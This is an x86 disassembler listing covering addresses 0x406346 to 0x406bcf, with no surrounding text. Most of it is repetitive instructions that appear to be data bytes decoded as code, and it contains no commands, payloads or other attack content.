  406346:	sub    BYTE PTR [edx],bh
  406348:	add    BYTE PTR [eax],al
  40634a:	add    BYTE PTR [eax],al
  40634c:	xchg   ebx,eax
  40634d:	add    BYTE PTR [edx+0x7803b610],bl
  406353:	add    BYTE PTR [eax+0x3a],dl
  406356:	add    BYTE PTR [eax],al
  406358:	add    BYTE PTR [eax],al
  40635a:	xchg   ebx,eax
  40635b:	add    BYTE PTR [ebp+0x7a03b610],ch
  406361:	add    BYTE PTR [eax+0x3a],bh
  406364:	add    BYTE PTR [eax],al
  406366:	add    BYTE PTR [eax],al
  406368:	xchg   ebx,eax
  406369:	add    bl,al
  40636b:	adc    BYTE PTR [esi-0x5fff83fd],dh
  406371:	cmp    al,BYTE PTR [eax]
  406373:	add    BYTE PTR [eax],al
  406375:	add    BYTE PTR [ebx-0x49ef2c00],dl
  40637b:	add    edi,DWORD PTR [esi+0x0]
  40637e:	(bad)  
  40637f:	cmp    al,BYTE PTR [eax]
  406381:	add    BYTE PTR [eax],al
  406383:	add    BYTE PTR [ebx+0x4a10f108],dl
  406389:	add    DWORD PTR [eax+0x3ad300],eax
  40638f:	add    BYTE PTR [eax],al
  406391:	add    BYTE PTR [ebx+0x4a110908],dl
  406397:	add    DWORD PTR [eax+0x3adf00],eax
  40639d:	add    BYTE PTR [eax],al
  40639f:	add    BYTE PTR [ebx+0x4a112208],dl
  4063a5:	add    DWORD PTR [eax+0x3aeb00],eax
  4063ab:	add    BYTE PTR [eax],al
  4063ad:	add    BYTE PTR [ebx+0x4a113d08],dl
  4063b3:	add    DWORD PTR [eax+0x3af700],eax
  4063b9:	add    BYTE PTR [eax],al
  4063bb:	add    BYTE PTR [ebx+0x4a116008],dl
  4063c1:	add    DWORD PTR [eax+0x3b0300],eax
  4063c7:	add    BYTE PTR [eax],al
  4063c9:	add    BYTE PTR [ebx+0x4a118308],dl
  4063cf:	add    DWORD PTR [eax+0x3b0f00],eax
  4063d5:	add    BYTE PTR [eax],al
  4063d7:	add    BYTE PTR [ebx+0x4a11a208],dl
  4063dd:	add    DWORD PTR [eax+0x3b1b00],eax
  4063e3:	add    BYTE PTR [eax],al
  4063e5:	add    BYTE PTR [ebx+0x4a11bd08],dl
  4063eb:	add    DWORD PTR [eax+0x3b2700],eax
  4063f1:	add    BYTE PTR [eax],al
  4063f3:	add    BYTE PTR [ebx+0x4a11d308],dl
  4063f9:	add    DWORD PTR [eax+0x3b3300],eax
  4063ff:	add    BYTE PTR [eax],al
  406401:	add    BYTE PTR [ebx+0x4a11ea08],dl
  406407:	add    DWORD PTR [eax+0x3b3f00],eax
  40640d:	add    BYTE PTR [eax],al
  40640f:	add    BYTE PTR [ebx+0x4a120908],dl
  406415:	add    DWORD PTR [eax+0x3b4b00],eax
  40641b:	add    BYTE PTR [eax],al
  40641d:	add    BYTE PTR [ebx+0x4a121f08],dl
  406423:	add    DWORD PTR [eax+0x3b5700],eax
  406429:	add    BYTE PTR [eax],al
  40642b:	add    BYTE PTR [ebx+0x4a123508],dl
  406431:	add    DWORD PTR [eax+0x3b6400],eax
  406437:	add    BYTE PTR [eax],al
  406439:	add    BYTE PTR [ebx-0x43edba00],dl
  40643f:	add    eax,DWORD PTR [eax+0x3b8700]
  406445:	add    BYTE PTR [eax],al
  406447:	add    BYTE PTR [ebx+0x4a124f08],dl
  40644d:	add    DWORD PTR [ecx+0x3b9400],eax
  406453:	add    BYTE PTR [eax],al
  406455:	add    BYTE PTR [ebx-0x43ed9900],dl
  40645b:	add    eax,DWORD PTR [ecx+0x3bb700]
  406461:	add    BYTE PTR [eax],al
  406463:	add    BYTE PTR [ebx+0x4a127008],dl
  406469:	add    DWORD PTR [edx+0x3bc400],eax
  40646f:	add    BYTE PTR [eax],al
  406471:	add    BYTE PTR [ebx-0x43ed7800],dl
  406477:	add    eax,DWORD PTR [edx+0x3be700]
  40647d:	add    BYTE PTR [eax],al
  40647f:	add    BYTE PTR [ebx+0x4a129108],dl
  406485:	add    DWORD PTR [ebx+0x3bf300],eax
  40648b:	add    BYTE PTR [eax],al
  40648d:	add    BYTE PTR [ebx+0x4a12a908],dl
  406493:	add    DWORD PTR [ebx+0x3c0000],eax
  406499:	add    BYTE PTR [eax],al
  40649b:	add    BYTE PTR [ebx-0x43f3b300],dl
  4064a1:	add    eax,DWORD PTR [ebx+0x3c2400]
  4064a7:	add    BYTE PTR [eax],al
  4064a9:	add    BYTE PTR [ebx-0x43f2cb00],dl
  4064af:	add    eax,DWORD PTR [eax+eax*1+0x3c48]
  4064b6:	add    BYTE PTR [eax],al
  4064b8:	xchg   ebx,eax
  4064b9:	add    BYTE PTR [edx],ah
  4064bb:	or     al,0xc1
  4064bd:	add    eax,DWORD PTR [ebp+0x3c7400]
  4064c3:	add    BYTE PTR [eax],al
  4064c5:	add    BYTE PTR [ebx-0x43f20600],dl
  4064cb:	add    ecx,DWORD PTR [eax+0x3c9800]
  4064d1:	add    BYTE PTR [eax],al
  4064d3:	add    BYTE PTR [ebx-0x43f3c800],dl
  4064d9:	add    ecx,DWORD PTR [ecx+0x3cbc00]
  4064df:	add    BYTE PTR [eax],al
  4064e1:	add    BYTE PTR [ebx-0x49f24000],dl
  4064e7:	add    ecx,DWORD PTR [edx+0x3ce400]
  4064ed:	add    BYTE PTR [eax],al
  4064ef:	add    BYTE PTR [ebx-0x49f25d00],dl
  4064f5:	add    ecx,DWORD PTR [eax+eax*1+0x3d0c]
  4064fc:	add    BYTE PTR [eax],al
  4064fe:	xchg   ebx,eax
  4064ff:	add    BYTE PTR [edx+0xc],dh
  406502:	mov    dh,0x3
  406504:	mov    es,WORD PTR [eax]
  406506:	xor    al,0x3d
  406508:	add    BYTE PTR [eax],al
  40650a:	add    BYTE PTR [eax],al
  40650c:	xchg   ebx,eax
  40650d:	add    BYTE PTR [edx+0xc],ah
  406510:	rol    DWORD PTR [ebx],0x90
  406513:	add    BYTE PTR [edi+0x3d],bl
  406516:	add    BYTE PTR [eax],al
  406518:	add    BYTE PTR [eax],al
  40651a:	xchg   ebx,eax
  40651b:	or     BYTE PTR [ecx-0x6cfeb5ee],bh
  406521:	add    BYTE PTR [ebx+0x3d],ch
  406524:	add    BYTE PTR [eax],al
  406526:	add    BYTE PTR [eax],al
  406528:	xchg   ebx,eax
  406529:	or     cl,bl
  40652b:	adc    cl,BYTE PTR [edx+0x1]
  40652e:	xchg   ebx,eax
  40652f:	add    BYTE PTR [edi+0x3d],dh
  406532:	add    BYTE PTR [eax],al
  406534:	add    BYTE PTR [eax],al
  406536:	xchg   ebx,eax
  406537:	or     bl,bh
  406539:	adc    cl,BYTE PTR [edx+0x1]
  40653c:	xchg   ebx,eax
  40653d:	add    BYTE PTR [ebx+0x3d],al
  406543:	add    BYTE PTR [ebx+0x4a131d08],dl
  406549:	add    DWORD PTR [ebx+0x3d9000],edx
  40654f:	add    BYTE PTR [eax],al
  406551:	add    BYTE PTR [ebx-0x49f34000],dl
  406557:	add    edx,DWORD PTR [ebx+0x3db800]
  40655d:	add    BYTE PTR [eax],al
  40655f:	add    BYTE PTR [ebx-0x3ef32a00],dl
  406565:	add    edx,DWORD PTR [ebp+0x3de300]
  40656b:	add    BYTE PTR [eax],al
  40656d:	add    BYTE PTR [ebx+0x4a132d08],dl
  406573:	add    DWORD PTR [eax+0x3def00],ebx
  406579:	add    BYTE PTR [eax],al
  40657b:	add    BYTE PTR [ebx+0x4a133e08],dl
  406581:	add    DWORD PTR [eax+0x3dfb00],ebx
  406587:	add    BYTE PTR [eax],al
  406589:	add    BYTE PTR [ebx-0x33eab700],dl
  40658f:	add    ebx,DWORD PTR [eax+0x3e0300]
  406595:	add    BYTE PTR [eax],al
  406597:	add    BYTE PTR [ebx-0x33eaaa00],dl
  40659d:	add    ebx,DWORD PTR [ecx+0x3e0b00]
  4065a3:	add    BYTE PTR [eax],al
  4065a5:	add    BYTE PTR [ebx-0x2dea9700],dl
  4065ab:	add    ebx,DWORD PTR [edx+0x3e1200]
  4065b1:	add    BYTE PTR [eax],al
  4065b3:	add    BYTE PTR [ebx-0x2dea8800],dl
  4065b9:	add    ebx,DWORD PTR [edx+0x3e1900]
  4065bf:	add    BYTE PTR [eax],al
  4065c1:	add    BYTE PTR [esi-0x28fc49e8],al
  4065c7:	add    ebx,DWORD PTR [edx+0x3e2900]
  4065cd:	add    BYTE PTR [eax],al
  4065cf:	add    BYTE PTR [esi-0x21ea6ff8],al
  4065d5:	add    ebx,DWORD PTR [eax+eax*1+0x3e31]
  4065dc:	add    BYTE PTR [eax],al
  4065de:	xchg   BYTE PTR [eax],bl
  4065e0:	mov    dh,0x3
  4065e2:	fadd   QWORD PTR [ecx]
  4065e4:	pushf  
  4065e5:	add    BYTE PTR [edx],bh
  4065e7:	add    BYTE PTR ds:[eax],al
  4065ea:	add    BYTE PTR [eax],al
  4065ec:	(bad)  
  4065ed:	or     dh,bl
  4065ef:	add    eax,DWORD PTR [ecx+0x0]
  4065f2:	popf   
  4065f3:	add    BYTE PTR [edx+0x3e],ah
  4065f6:	add    BYTE PTR [eax],al
  4065f8:	add    BYTE PTR [eax],al
  4065fa:	xchg   BYTE PTR [eax],bl
  4065fc:	mov    dh,0x3
  4065fe:	fadd   QWORD PTR [ecx]
  406600:	popf   
  406601:	add    BYTE PTR [ebx+0x3e],ch
  406604:	add    BYTE PTR [eax],al
  406606:	add    BYTE PTR [eax],al
  406608:	les    eax,FWORD PTR [eax]
  40660a:	add    ebx,DWORD PTR [edx]
  40660c:	xchg   ebp,eax
  40660d:	add    DWORD PTR [esi+0x3e7300],ebx
  406613:	add    BYTE PTR [eax],al
  406615:	add    BYTE PTR [ebx+0xa03b618],al
  40661b:	add    DWORD PTR [edi+0x3e9800],ebx
  406621:	add    BYTE PTR [eax],al
  406623:	add    BYTE PTR [ecx+0x71a4800],dl
  406629:	cs lahf 
  40662b:	add    ah,al
  40662d:	add    BYTE PTR ds:[eax],al
  406630:	add    BYTE PTR [eax],al
  406632:	xchg   ecx,eax
  406633:	or     BYTE PTR [ebx+0x1a],dh
  406636:	or     al,0x2e
  406638:	lahf   
  406639:	add    al,cl
  40663b:	add    BYTE PTR ds:[eax],al
  40663e:	add    BYTE PTR [eax],al
  406640:	xchg   esi,eax
  406641:	add    BYTE PTR [edi+0x1a],bh
  406644:	adc    DWORD PTR [esi],ebp
  406646:	lahf   
  406647:	add    BYTE PTR [edi+edi*1+0x0],cl
  40664b:	add    BYTE PTR [eax],al
  40664d:	add    BYTE PTR [esi+0x181a7f00],dl
  406653:	mov    eax,cs:0x1000000
  406659:	add    BYTE PTR [ecx+0x200001a],dl
  40665f:	add    BYTE PTR [esi+0x300001a],dl
  406665:	add    BYTE PTR [esi+0x400001a],ch
  40666b:	add    ah,al
  40666d:	sbb    al,BYTE PTR [eax]
  40666f:	add    BYTE PTR [ecx],al
  406671:	add    BYTE PTR [ecx+0x200001a],dl
  406677:	add    bh,cl
  406679:	sbb    al,BYTE PTR [eax]
  40667b:	add    BYTE PTR [ebx],al
  40667d:	add    BYTE PTR [esi+0x400001a],dl
  406683:	add    BYTE PTR [esi+0x500001a],ch
  406689:	add    ah,al
  40668b:	sbb    al,BYTE PTR [eax]
  40668d:	add    BYTE PTR [ecx],al
  40668f:	add    BYTE PTR [ecx+0x200001a],dl
  406695:	add    bh,cl
  406697:	sbb    al,BYTE PTR [eax]
  406699:	add    BYTE PTR [ebx],al
  40669b:	add    BYTE PTR [esi+0x400001a],dl
  4066a1:	add    cl,bl
  4066a3:	sbb    al,BYTE PTR [eax]
  4066a5:	add    BYTE PTR ds:0x1ae600,al
  4066ab:	add    BYTE PTR [ecx],al
  4066ad:	add    BYTE PTR [ecx+0x200001a],dl
  4066b3:	add    bh,cl
  4066b5:	sbb    al,BYTE PTR [eax]
  4066b7:	add    BYTE PTR [ebx],al
  4066b9:	add    BYTE PTR [esi+0x400001a],dl
  4066bf:	add    BYTE PTR [esi+0x500001a],ch
  4066c5:	add    ah,al
  4066c7:	sbb    al,BYTE PTR [eax]
  4066c9:	add    BYTE PTR [esi],al
  4066cb:	add    cl,bl
  4066cd:	sbb    al,BYTE PTR [eax]
  4066cf:	add    BYTE PTR [edi],al
  4066d1:	add    dh,ah
  4066d3:	sbb    al,BYTE PTR [eax]
  4066d5:	add    BYTE PTR [ecx],al
  4066d7:	add    bh,bh
  4066d9:	sbb    al,BYTE PTR [eax]
  4066db:	add    BYTE PTR [edx],al
  4066dd:	add    BYTE PTR [edx],al
  4066df:	sbb    eax,DWORD PTR [eax]
  4066e1:	add    BYTE PTR [ebx],al
  4066e3:	add    BYTE PTR [ebx+ebx*1],cl
  4066e6:	add    BYTE PTR [eax],al
  4066e8:	add    DWORD PTR [eax],eax
  4066ea:	xchg   ecx,eax
  4066eb:	sbb    al,BYTE PTR [eax]
  4066ed:	add    BYTE PTR [edx],al
  4066ef:	add    BYTE PTR ds:0x100001b,dl
  4066f5:	add    BYTE PTR ds:0x100001b,dl
  4066fb:	add    BYTE PTR [ecx+0x200001a],dl
  406701:	add    BYTE PTR ds:0x100001b,dl
  406707:	add    BYTE PTR [ecx+0x200001a],dl
  40670d:	add    BYTE PTR ds:0x100001b,dl
  406713:	add    bh,bh
  406715:	sbb    al,BYTE PTR [eax]
  406717:	add    BYTE PTR [edx],al
  406719:	add    BYTE PTR [edx],al
  40671b:	sbb    eax,DWORD PTR [eax]
  40671d:	add    BYTE PTR [ebx],al
  40671f:	add    BYTE PTR [ebx+ebx*1],cl
  406722:	add    BYTE PTR [eax],al
  406724:	add    DWORD PTR [eax],eax
  406726:	call   FWORD PTR [edx]
  406728:	add    BYTE PTR [eax],al
  40672a:	add    al,BYTE PTR [eax]
  40672c:	add    bl,BYTE PTR [ebx]
  40672e:	add    BYTE PTR [eax],al
  406730:	add    eax,DWORD PTR [eax]
  406732:	or     al,0x1b
  406734:	add    BYTE PTR [eax],al
  406736:	add    DWORD PTR [eax],eax
  406738:	adc    eax,0x100001b
  40673d:	add    BYTE PTR [ebx],bl
  40673f:	sbb    eax,DWORD PTR [eax]
  406741:	add    BYTE PTR [ecx],al
  406743:	add    BYTE PTR [ebx],bl
  406745:	sbb    eax,DWORD PTR [eax]
  406747:	add    BYTE PTR [ecx],al
  406749:	add    BYTE PTR [eax],ah
  40674b:	sbb    eax,DWORD PTR [edx]
  40674d:	add    BYTE PTR [edx],al
  40674f:	add    BYTE PTR [ecx+0x300021a],dl
  406755:	add    BYTE PTR ds:0x100001b,dl
  40675b:	add    BYTE PTR ds:0x100001b,dl
  406761:	add    BYTE PTR ds:0x100001b,dl
  406767:	add    BYTE PTR [eax+0x1b],dl
  40676a:	add    BYTE PTR [eax],al
  40676c:	add    al,BYTE PTR [eax]
  40676e:	sbb    eax,DWORD PTR fs:[eax]
  406771:	add    BYTE PTR [ecx],al
  406773:	add    BYTE PTR [edx+0x1b],dh
  406776:	add    BYTE PTR [eax],al
  406778:	add    al,BYTE PTR [eax]
  40677a:	sbb    DWORD PTR [ebx],0x0
  40677d:	add    BYTE PTR [ebx],al
  40677f:	add    BYTE PTR [esi+0x400001b],dl
  406785:	add    BYTE PTR [ebp+0x500001b],ah
  40678b:	add    BYTE PTR [esi+0x100001b],dh
  406791:	add    BYTE PTR [esi+0x200001b],bh
  406797:	add    BYTE PTR [esi+0x100001b],dh
  40679d:	add    al,cl
  40679f:	sbb    eax,DWORD PTR [eax]
  4067a1:	add    BYTE PTR [edx],al
  4067a3:	add    dl,dl
  4067a5:	sbb    eax,DWORD PTR [eax]
  4067a7:	add    BYTE PTR [ebx],al
  4067a9:	add    bh,bl
  4067ab:	sbb    eax,DWORD PTR [eax]
  4067ad:	add    BYTE PTR [ecx],al
  4067af:	add    al,cl
  4067b1:	sbb    eax,DWORD PTR [eax]
  4067b3:	add    BYTE PTR [edx],al
  4067b5:	add    dl,dl
  4067b7:	sbb    eax,DWORD PTR [eax]
  4067b9:	add    BYTE PTR [ebx],al
  4067bb:	add    bh,bl
  4067bd:	sbb    eax,DWORD PTR [eax]
  4067bf:	add    BYTE PTR [eax+eax*1],al
  4067c2:	out    0x1b,eax
  4067c4:	add    BYTE PTR [eax],al
  4067c6:	add    DWORD PTR [eax],eax
  4067c8:	repz sbb eax,DWORD PTR [eax]
  4067cb:	add    BYTE PTR [edx],al
  4067cd:	add    dl,bh
  4067cf:	sbb    eax,DWORD PTR [eax]
  4067d1:	add    BYTE PTR [ecx],al
  4067d3:	add    dl,bh
  4067d5:	sbb    eax,DWORD PTR [eax]
  4067d7:	add    BYTE PTR [ecx],al
  4067d9:	add    BYTE PTR [ebx],al
  4067db:	sbb    al,0x0
  4067dd:	add    BYTE PTR [ecx],al
  4067df:	add    bl,dh
  4067e1:	sbb    eax,DWORD PTR [eax]
  4067e3:	add    BYTE PTR [ecx],al
  4067e5:	add    BYTE PTR [ecx],cl
  4067e7:	sbb    al,0x0
  4067e9:	add    BYTE PTR [edx],al
  4067eb:	add    BYTE PTR [esp+ebx*1],dl
  4067ee:	add    BYTE PTR [eax],al
  4067f0:	add    DWORD PTR [eax],eax
  4067f2:	sbb    eax,0x200001c
  4067f7:	add    BYTE PTR [ecx],ch
  4067f9:	sbb    al,0x0
  4067fb:	add    BYTE PTR [ecx],al
  4067fd:	add    BYTE PTR [ecx],dh
  4067ff:	sbb    al,0x0
  406801:	add    BYTE PTR [edx],al
  406803:	add    BYTE PTR [esi],bh
  406805:	sbb    al,0x0
  406807:	add    BYTE PTR [ebx],al
  406809:	add    BYTE PTR [ecx+0x1c],dl
  40680c:	add    BYTE PTR [eax],al
  40680e:	add    DWORD PTR [eax],eax
  406810:	push   0x100001c
  406815:	add    BYTE PTR [eax+0x1c],ch
  406818:	add    BYTE PTR [eax],al
  40681a:	add    DWORD PTR [eax],eax
  40681c:	ins    DWORD PTR es:[edi],dx
  40681d:	sbb    al,0x0
  40681f:	add    BYTE PTR [edx],al
  406821:	add    BYTE PTR [ebx+0x1c],dh
  406824:	add    BYTE PTR [eax],al
  406826:	add    DWORD PTR [eax],eax
  406828:	push   0x100001c
  40682d:	add    BYTE PTR [ebx],al
  40682f:	sbb    al,0x0
  406831:	add    BYTE PTR [ecx],al
  406833:	add    BYTE PTR [ebp+0x22],ch
  406836:	add    BYTE PTR [eax],al
  406838:	add    DWORD PTR [eax],eax
  40683a:	sbb    ebx,DWORD PTR [ebx]
  40683c:	add    BYTE PTR [eax],al
  40683e:	add    DWORD PTR [eax],eax
  406840:	jle    0x40685e
  406842:	add    BYTE PTR [eax],al
  406844:	add    DWORD PTR [eax],eax
  406846:	xchg   DWORD PTR [eax+eax*1],ebx
  406849:	add    BYTE PTR [ecx],al
  40684b:	add    BYTE PTR [edi+0x100001c],al
  406851:	add    BYTE PTR [esi+0x200001c],cl
  406857:	add    BYTE PTR [edi+0x300001c],dl
  40685d:	add    BYTE PTR [esp+ebx*1+0x10000],ah
  406864:	scas   eax,DWORD PTR es:[edi]
  406865:	sbb    al,0x0
  406867:	add    BYTE PTR [ecx],al
  406869:	add    BYTE PTR [ebp+0x200001c],dh
  40686f:	add    BYTE PTR [esi+0x300001c],bh
  406875:	add    bl,al
  406877:	sbb    al,0x0
  406879:	add    BYTE PTR [eax+eax*1],al
  40687c:	mov    dh,0x1b
  40687e:	add    BYTE PTR [eax],al
  406880:	add    eax,0x1cca00
  406885:	add    BYTE PTR [esi],al
  406887:	add    BYTE PTR [esi+0x100001c],cl
  40688d:	add    BYTE PTR [ebp+0x200001c],dh
  406893:	add    BYTE PTR [esi+0x300001c],bh
  406899:	add    bl,al
  40689b:	sbb    al,0x0
  40689d:	add    BYTE PTR [eax+eax*1],al
  4068a0:	mov    dh,0x1b
  4068a2:	add    BYTE PTR [eax],al
  4068a4:	add    eax,0x1cca00
  4068a9:	add    BYTE PTR [esi],al
  4068ab:	add    BYTE PTR [esi+0x100001c],cl
  4068b1:	add    ah,dl
  4068b3:	sbb    al,0x0
  4068b5:	add    BYTE PTR [ecx],al
  4068b7:	add    BYTE PTR [ebx],bl
  4068b9:	sbb    eax,DWORD PTR [eax]
  4068bb:	add    BYTE PTR [ecx],al
  4068bd:	add    BYTE PTR ds:0x100001b,dl
  4068c3:	add    BYTE PTR ds:0x100001b,dl
  4068c9:	add    BYTE PTR ds:0x100001b,dl
  4068cf:	add    BYTE PTR ds:0x100001b,dl
  4068d5:	add    BYTE PTR ds:0x100001b,dl
  4068db:	add    bh,dl
  4068dd:	sbb    al,0x0
  4068df:	add    BYTE PTR [edx],al
  4068e1:	add    BYTE PTR [ecx],dh
  4068e3:	sbb    al,0x0
  4068e5:	add    BYTE PTR [ebx],al
  4068e7:	add    dh,ah
  4068e9:	sbb    al,0x0
  4068eb:	add    BYTE PTR [ecx],al
  4068ed:	add    ch,dh
  4068ef:	sbb    al,0x0
  4068f1:	add    BYTE PTR [edx],al
  4068f3:	add    BYTE PTR [ecx],al
  4068f5:	sbb    eax,0x10000
  4068fa:	xor    DWORD PTR [eax+eax*1],ebx
  4068fd:	add    BYTE PTR [edx],al
  4068ff:	add    BYTE PTR [ebp+0x100001c],dh
  406905:	add    BYTE PTR [ecx],dh
  406907:	sbb    al,0x0
  406909:	add    BYTE PTR [edx],al
  40690b:	add    BYTE PTR [ebp+0x100001c],dh
  406911:	add    BYTE PTR [edi],dl
  406913:	sbb    eax,0x20000
  406918:	sbb    bl,BYTE PTR ds:0x10000
  40691e:	pop    ss
  40691f:	sbb    eax,0x10000
  406924:	pop    ss
  406925:	sbb    eax,0x20000
  40692a:	sbb    bl,BYTE PTR ds:0x10000
  406930:	pop    ss
  406931:	sbb    eax,0x20000
  406936:	sbb    bl,BYTE PTR ds:0x10000
  40693c:	pop    ss
  40693d:	sbb    eax,0x20000
  406942:	sbb    bl,BYTE PTR ds:0x10000
  406948:	pop    ss
  406949:	sbb    eax,0x20000
  40694e:	sbb    bl,BYTE PTR ds:0x10000
  406954:	pop    ss
  406955:	sbb    eax,0x10000
  40695a:	pop    ss
  40695b:	sbb    eax,0x10000
  406960:	pop    ss
  406961:	sbb    eax,0x10000
  406966:	pop    ss
  406967:	sbb    eax,0x10000
  40696c:	pop    ss
  40696d:	sbb    eax,0x10000
  406972:	pop    ss
  406973:	sbb    eax,0x20000
  406978:	sbb    bl,BYTE PTR ds:0x30000
  40697e:	sbb    eax,0x100001d
  406983:	add    BYTE PTR [edi],dl
  406985:	sbb    eax,0x10000
  40698a:	pop    ss
  40698b:	sbb    eax,0x10000
  406990:	pop    ss
  406991:	sbb    eax,0x20000
  406996:	sbb    bl,BYTE PTR ds:0x10000
  40699c:	pop    ss
  40699d:	sbb    eax,0x20000
  4069a2:	sbb    bl,BYTE PTR ds:0x10000
  4069a8:	pop    ss
  4069a9:	sbb    eax,0x20000
  4069ae:	sbb    bl,BYTE PTR ds:0x10000
  4069b4:	pop    ss
  4069b5:	sbb    eax,0x20000
  4069ba:	sbb    bl,BYTE PTR ds:0x30000
  4069c0:	sbb    eax,0x100001d
  4069c5:	add    BYTE PTR [edi],dl
  4069c7:	sbb    eax,0x20000
  4069cc:	sbb    bl,BYTE PTR ds:0x10000
  4069d2:	pop    ss
  4069d3:	sbb    eax,0x20000
  4069d8:	sbb    bl,BYTE PTR ds:0x30000
  4069de:	sbb    eax,0x100001d
  4069e3:	add    BYTE PTR [eax],ah
  4069e5:	sbb    eax,0x10000
  4069ea:	and    BYTE PTR ds:0x10000,bl
  4069f0:	mov    dh,0x1b
  4069f2:	add    BYTE PTR [eax],al
  4069f4:	add    al,BYTE PTR [eax]
  4069f6:	retf   0x1c
  4069f9:	add    BYTE PTR [ecx],al
  4069fb:	add    BYTE PTR ds:0x100001c,bl
  406a01:	add    BYTE PTR [edx],ch
  406a03:	sbb    eax,0x10000
  406a08:	adc    eax,0x100001b
  406a0d:	add    BYTE PTR [ecx+0x200001a],dl
  406a13:	add    BYTE PTR [ebx],bl
  406a15:	sbb    eax,DWORD PTR [eax]
  406a17:	add    BYTE PTR [ecx],al
  406a19:	add    BYTE PTR [ecx+0x6000c1a],dl
  406a1f:	add    BYTE PTR [eax+eax*1],cl
  406a22:	or     al,BYTE PTR [eax]
  406a24:	or     al,0x0
  406a26:	sbb    eax,0x70003900
  406a2b:	or     ebp,esi
  406a2d:	add    ecx,ebp
  406a2f:	add    BYTE PTR [esi-0xefef5fd],dh
  406a35:	add    BYTE PTR [esi-0x6fef5fd],dh
  406a3b:	add    BYTE PTR [esi+0x1012703],dh
  406a41:	add    DWORD PTR [esi+0x9012703],esi
  406a47:	add    DWORD PTR [esi+0x1101dc03],esi
  406a4d:	add    DWORD PTR [esi+0x1901dc03],esi
  406a53:	add    DWORD PTR [esi+0x2101dc03],esi
  406a59:	add    DWORD PTR [esi+0x2901dc03],esi
  406a5f:	add    DWORD PTR [esi+0x3101dc03],esi
  406a65:	add    DWORD PTR [esi+0x3901dc03],esi
  406a6b:	add    DWORD PTR [esi+0x4101dc03],esi
  406a71:	add    DWORD PTR [esi+0x4901dc03],esi
  406a77:	add    DWORD PTR [esi+0x5101dc03],esi
  406a7d:	add    DWORD PTR [esi+0x5901dc03],esi
  406a83:	add    DWORD PTR [esi+0x6101dc03],esi
  406a89:	add    DWORD PTR [esi+0x69012703],esi
  406a8f:	add    DWORD PTR [esi+0x7101dc03],esi
  406a95:	add    DWORD PTR [esi-0x7ed1ddfd],esi
  406a9b:	add    DWORD PTR [esi-0x76fe74fd],esi
  406aa1:	add    DWORD PTR [esi-0x6efef5fd],esi
  406aa7:	add    DWORD PTR [esi+0x92e3a03],esi
  406aad:	add    BYTE PTR [esi-0x5efef5fd],dh
  406ab3:	add    DWORD PTR [eax+0x112e5b1f],ebp
  406ab9:	add    BYTE PTR [esi+0x1c010a03],dh
  406abf:	add    BYTE PTR [esi+0x59010a03],dh
  406ac5:	add    BYTE PTR [esi+0x412e681f],dh
  406acb:	add    BYTE PTR [edi+0x592e6f1f],bh
  406ad1:	add    BYTE PTR [esi],ah
  406ad3:	add    eax,0x592e82
  406ad8:	xchg   edx,eax
  406ad9:	add    eax,0x6900a3
  406ade:	hlt    
  406adf:	pop    ds
  406ae0:	inc    ebp
  406ae1:	add    BYTE PTR [ecx+0x0],ch
  406ae4:	adc    DWORD PTR [eax],esp
  406ae6:	mov    ch,BYTE PTR [esi]
  406ae8:	and    DWORD PTR [eax],eax
  406aea:	sub    DWORD PTR [eax],esp
  406aec:	xchg   edx,eax
  406aed:	rol    DWORD PTR cs:[ecx],0x70
  406af1:	or     ebp,esi
  406af3:	add    DWORD PTR [ecx-0x6adfcd00],ebx
  406af9:	add    BYTE PTR [ecx],dl
  406afb:	add    BYTE PTR [edi],bh
  406afd:	and    BYTE PTR [ecx+0x0],al
  406b00:	mov    eax,ds:0x9a205901
  406b05:	cs cdq 
  406b07:	add    BYTE PTR [eax+0x20],ah
  406b0a:	inc    ebp
  406b0b:	add    cl,dl
  406b0d:	add    DWORD PTR [ebp+0x20],esi
  406b10:	or     al,BYTE PTR [ecx]
  406b12:	mov    eax,ds:0xad207d01
  406b17:	fld    DWORD PTR cs:[ecx]
  406b1a:	mov    dh,0x3
  406b1c:	or     al,BYTE PTR [ecx]
  406b1e:	and    DWORD PTR [eax],eax
  406b20:	mov    ds:0xd92eb320,eax
  406b25:	add    DWORD PTR [edx-0x26fe8ef8],eax
  406b2b:	add    DWORD PTR [eax+eiz*1+0x692eba],ebp
  406b32:	mov    bl,0x20
  406b34:	retf   
  406b35:	cs or  al,0x0
  406b38:	xor    cl,BYTE PTR [ecx]
  406b3a:	shr    DWORD PTR [esi],1
  406b3c:	or     al,0x0
  406b3e:	push   cs
  406b3f:	or     BYTE PTR [ecx+0x1],dh
  406b42:	and    al,0x0
  406b44:	mov    dh,0x3
  406b46:	or     al,BYTE PTR [ecx]
  406b48:	sub    al,0x0
  406b4a:	aam    0x20
  406b4c:	out    dx,eax
  406b4d:	cs xor al,0x0
  406b50:	jo     0x406b5b
  406b52:	add    al,0x2f
  406b54:	cmp    al,0x0
  406b56:	xor    esp,DWORD PTR [eax]
  406b58:	sbb    DWORD PTR [edi],ebp
  406b5a:	and    al,0x0
  406b5c:	jmp    0x3200:0x242f1e20
  406b63:	or     DWORD PTR [edi+ebp*1],esp
  406b66:	cmp    al,0x0
  406b68:	pusha  
  406b69:	and    BYTE PTR [ebp+0x0],al
  406b6c:	sub    al,0x0
  406b6e:	jmp    0x1800:0x2c2f1e20
  406b75:	or     BYTE PTR [edi+ebp*1],ch
  406b78:	and    al,0x0
  406b7a:	mul    BYTE PTR [eax]
  406b7c:	and    al,0x2f
  406b7e:	and    al,0x0
  406b80:	jo     0x406b8b
  406b82:	xor    ebp,DWORD PTR [edi]
  406b84:	inc    esp
  406b85:	add    BYTE PTR [ebx],dh
  406b87:	and    BYTE PTR [eax+0x2f],cl
  406b8a:	dec    esp
  406b8b:	add    bh,bh
  406b8d:	and    BYTE PTR [ecx],bl
  406b8f:	das    
  406b90:	dec    esp
  406b91:	add    BYTE PTR [ecx],cl
  406b93:	and    DWORD PTR [ebx+0x2f],ebx
  406b96:	inc    esp
  406b97:	add    BYTE PTR [eax+0x20],ah
  406b9a:	inc    ebp
  406b9b:	add    BYTE PTR [ecx+0x71088201],ah
  406ba1:	add    DWORD PTR [ecx-0x6ddeeeff],esp
  406ba7:	das    
  406ba8:	mov    eax,ds:0x97211b01
  406bad:	das    
  406bae:	mov    eax,ds:0x90212301
  406bb3:	add    DWORD PTR [ecx-0x62dedcff],esp
  406bb9:	das    
  406bba:	mov    eax,ds:0x16212d01
  406bbf:	add    cl,bh
  406bc1:	add    DWORD PTR [edx+0x21],eax
  406bc4:	test   eax,0xb6002c2f
  406bc9:	add    ebp,DWORD PTR [edi+0x6c00112f]
  406bcf:	and    DWORD PTR [ebx-0x7eff9700],esp
